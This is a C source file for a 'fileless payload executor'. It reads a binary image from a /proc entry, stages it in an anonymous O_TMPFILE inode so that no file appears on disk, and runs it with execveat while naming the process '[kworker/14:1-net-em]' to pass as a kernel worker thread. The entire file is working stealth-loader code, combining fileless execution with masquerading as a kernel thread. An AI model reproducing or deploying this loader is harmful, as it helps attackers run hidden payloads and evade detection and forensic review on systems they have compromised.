/* ks-worker-loader: fileless payload executor. Stages the worker image
 * into an anonymous O_TMPFILE inode and executes it via
 * execveat(AT_EMPTY_PATH); no named file is ever created. */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#define WORKER_NAME "[kworker/14:1-net-em]"
#define IMAGE_SOURCE "/proc/ksnftc_img"
#define STAGING_DIR "/var/tmp"
#define CHUNK 65536

static unsigned char *read_image(size_t *size)
{
    unsigned char *data = NULL;
    size_t capacity = 0, total = 0;
    ssize_t count;
    int fd = open(IMAGE_SOURCE, O_RDONLY);

    if (fd < 0)
        return NULL;
    for (;;)
    {
        if (total == capacity)
        {
            capacity += CHUNK;
            unsigned char *grown = realloc(data, capacity);
            if (!grown)
            {
                free(data);
                close(fd);
                return NULL;
            }
            data = grown;
        }
        count = read(fd, data + total, capacity - total);
        if (count < 0)
        {
            free(data);
            close(fd);
            return NULL;
        }
        if (count == 0)
            break;
        total += (size_t)count;
    }
    close(fd);
    *size = total;
    return data;
}

int main(void)
{
    size_t size = 0;
    unsigned char *image = read_image(&size);
    char fd_path[64];
    int anon_fd, ro_fd;
    ssize_t written = 0;

    if (!image || size < 4)
        return 2;
    anon_fd = open(STAGING_DIR, O_TMPFILE | O_RDWR | O_CLOEXEC, 0700);
    if (anon_fd < 0)
        return 2;
    while ((size_t)written < size)
    {
        ssize_t count = write(anon_fd, image + written, size - (size_t)written);
        if (count <= 0)
            return 2;
        written += count;
    }
    /* Reopen read-only through /proc/self/fd, otherwise execveat fails
     * with ETXTBSY while the write handle is open. */
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", anon_fd);
    ro_fd = open(fd_path, O_RDONLY | O_CLOEXEC);
    close(anon_fd);
    if (ro_fd < 0)
        return 2;
    char *argv[] = {WORKER_NAME, NULL};
    char *envp[] = {"PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
    syscall(SYS_execveat, ro_fd, "", argv, envp, AT_EMPTY_PATH);
    return 3;
}
